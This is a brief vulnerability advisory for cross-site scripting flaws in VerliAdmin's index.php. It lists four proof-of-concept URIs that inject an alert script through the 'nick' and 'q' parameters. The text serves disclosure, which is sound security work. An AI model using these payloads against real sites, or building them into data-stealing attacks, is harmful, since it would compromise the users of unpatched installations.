VerliAdmin 'index.php' Multiple Cross-Site Scripting Vulnerabilities

An attacker can exploit these issues by enticing an unsuspecting user to follow a malicious URI.

The following example URIs are available:

http//www.example.com/index.php?q=bantest&amp;nick="&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
http//www.example.com/index.php?nick="'/&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
http//www.example.com/index.php?q="'/&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
http//www.example.com/index.php?"'/&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
